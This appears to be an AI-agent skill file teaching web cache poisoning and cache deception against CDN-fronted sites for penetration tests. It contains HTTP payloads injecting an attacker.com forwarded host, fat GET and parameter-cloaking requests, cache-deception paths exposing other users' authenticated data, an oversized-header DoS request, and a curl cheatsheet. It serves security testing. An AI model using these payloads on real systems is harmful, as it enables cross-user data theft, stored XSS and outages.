---
name: offensive-cache-poisoning-deception
description: "Web cache poisoning and cache deception attack methodology — keyed-vs-unkeyed input research with Param Miner, header-based cache poisoning, fat GET cache poisoning, cache key normalization flaws (case, encoding, trailing slash), parameter cloaking, cache deception (path-confusion-based caching of authenticated content), CDN-specific behaviors (Cloudflare, Fastly, Akamai, CloudFront), and chained DoS / XSS / open-redirect via cache. Use when an engagement target sits behind a CDN or any caching reverse proxy."
---

# Web Cache Poisoning & Deception

Caches were supposed to be transparent — they aren't. Every CDN keys the cache differently from how the origin parses requests, and that gap is the attack surface. Poisoning lets you inject content into another visitor's response; deception lets you cache another user's authenticated content under a public-looking URL.

## Quick Workflow

1. Identify the cache (CDN, reverse proxy, application cache)
2. Probe for unkeyed inputs (headers, parameters that change response but don't change cache key)
3. Find a poisoning gadget (XSS, redirect, content rewrite via unkeyed input)
4. Land the poisoned response into cache with consistent cache key
5. Verify: a clean visitor receives the poisoned response

---

## Cache Anatomy

```
Request → Cache (computes cache key from request) → Origin (computes response from request) → Cache stores by key → Future request matches key → Cache serves stored response
```

The exploitable mismatch: cache key = `Host + Path + ?params`, response depends on `Host + Path + ?params + Headers`. Headers vary the response but not the key → poison.

## Fingerprinting the Cache

```bash
curl -sI https://target.com/ | grep -iE "(cache|cf-|x-cache|server|via|age)"
```

| Header | Indicates |
|---|---|
| `CF-Cache-Status: HIT/MISS` | Cloudflare |
| `Cache-Control` + `X-Cache: Hit/Miss from cloudfront` | CloudFront |
| `X-Cache: HIT` | Varnish / generic |
| `Fastly-Debug-Path` (with debug enabled) | Fastly |
| `X-Akamai-Transformed` | Akamai |
| `Age:` | Most CDNs (request was cached) |

## Test Methodology — Param Miner

```
Burp → Extender → BApp Store → Param Miner
Right-click request → Param Miner → Guess headers
```

Param Miner sends thousands of header names with random values, looking for headers that change the response but not the cache key. Every flagged header is a potential poisoning vector.

### Header Examples to Probe

```
X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-For, X-Real-IP,
X-Original-URL, X-Rewrite-URL, X-Host, X-Forwarded-Server,
X-HTTP-Method-Override, X-HTTP-Method, X-Method-Override,
X-Wap-Profile, X-Original-Host, X-Forwarded-Port,
X-Traceparent, X-Datacenter, X-Cache-Key, X-Server-IP, X-Backend-Server
```

## Classic Header-Based Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If the origin uses `X-Forwarded-Host` for canonical URL / OG tags / redirects:

```html
<meta property="og:url" content="https://attacker.com/">
<link rel="canonical" href="https://attacker.com/">
```

That HTML lands in the cache under the legitimate cache key. Every subsequent visitor sees attacker-controlled meta tags. Combine with browser quirks (canonical link followed by some clients) for redirect-style impact.

## Cache-Key-Normalization Flaws

Cache normalizes URL differently from origin:

```
Cache key:   /home
Origin sees: /home?utm_source=evil   (origin reflects utm_source unsanitized)

Result: poisoned response for /home cached under /home key, served to all
```

Test by varying:
- Trailing slash: `/home` vs `/home/`
- Case: `/HOME` vs `/home`
- Path encoding: `/home` vs `/h%6fme`
- Method: `GET` vs `POST` (some caches share keys)
- Fragment: `/home#x` (cache may strip; origin may not)

## Fat GET Poisoning

```http
GET /api/profile HTTP/1.1
Content-Length: 5
Host: target.com
Content-Type: application/json

{"a":1}
```

Cache might key only on URL while origin parses the body and reflects values. Body content lands in response body, cached.

## Parameter Cloaking

```http
GET /home?lang=en;poison=1 HTTP/1.1
```

Some apps split on `?` and `&` while caches strip semicolons or vice versa — same URL, different parameters parsed.

## Cache Deception

Goal: get the cache to store *another user's* authenticated response under a public URL.

```http
GET /api/me/profile/style.css HTTP/1.1
Cookie: SESSIONID=victim
```

If the cache caches `*.css` regardless of cookie, and the origin returns the user's profile data (because the path matched a route handler), the response is cached under the `style.css` URL — accessible to attacker.

```bash
# Trick the user into making the request via crafted link
https://target.com/api/me/profile/style.css
# (returns user's data; cache stores it; attacker fetches the URL)
```

Patterns:
- `/profile/<userid>/style.css`
- `/account.json/_next/data/static.json`
- `/index.html` interpreted as authenticated route + file extension

## CDN-Specific Behaviors

### Cloudflare
- Origin headers (`X-Original-URL`) sometimes overrode path
- Cache rules customizable via Page Rules / Cache Rules
- CF Workers can rewrite cache key — if misconfigured, exploitable
- `CF-Cache-Status: BYPASS` indicates the request bypassed cache (auth header, cookie present)

### Fastly
- Surrogate-Key based purging
- VCL gives clients no signal; debug mode (`Fastly-Debug-1`) optional
- Custom request normalization in VCL

### Akamai
- Edge caching with surrogate keys
- Sure Route, prefetch — fetches resources speculatively, can amplify poisoning

### CloudFront
- Origin Request Policy controls headers forwarded to origin
- Cache Policy controls cache key
- Mismatch exploitable — origin sees header, cache doesn't key on it

## Chained Impact

| Gadget | Cache Effect |
|---|---|
| Reflected XSS in unkeyed header | Stored XSS for all cache visitors |
| Open redirect in unkeyed param | Persistent open redirect under public URL |
| Reflected content in JSON | Browser fingerprint / API result manipulation |
| Header → 301 redirect | Permanent traffic redirect for cached path |
| 4xx/5xx response | DoS via cache poisoning (clean visitors see error) |

## DoS via Cache

```http
GET / HTTP/1.1
Host: target.com
Hugely-Long-Custom-Header: <16KB junk>
```

If the origin errors on oversize headers but the cache stores the 4xx response, all clean visitors see the error until cache expiry.

## Engagement Cheatsheet

```bash
# 1. Fingerprint cache
curl -sI https://target.com/ | grep -iE "(cf-|x-cache|server|via|age|cache)"

# 2. Param Miner sweep (Burp)
# Right-click target → Param Miner → Guess headers

# 3. For each unkeyed header found, test reflection
curl https://target.com/ -H "X-Forwarded-Host: attacker.com" -I

# 4. Land cache hit (repeat the request, observe Age header increments)
curl https://target.com/ -H "X-Forwarded-Host: attacker.com" -I; sleep 1
curl https://target.com/ -I  # check if poisoned response served

# 5. Cache deception probes
curl https://target.com/api/me/profile/style.css -b "session=mine"
curl https://target.com/api/me/profile/style.css   # do you see your own data?

# 6. Document cache key normalization quirks (slash, case, encoding)
```

## Detection

| Signal | Defender View |
|---|---|
| Param Miner traffic | High volume of header-mutation requests |
| Cached error pages | Anomaly in cache hit rate / response codes |
| Customer reports | "I see someone else's data" — most reliable indicator |

## Reporting

- Identify the unkeyed input precisely
- Demonstrate poison + clean-fetch reproducibility
- Quantify cache TTL (impact duration)
- Note CDN provider — same gadget often works across customers

---

## Key References

- "Practical Web Cache Poisoning" — James Kettle (PortSwigger 2018)
- "Cache Poisoning at Scale" — PortSwigger 2020
- "Web Cache Deception" — Omer Gil
- Param Miner: github.com/PortSwigger/param-miner
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/cache.md
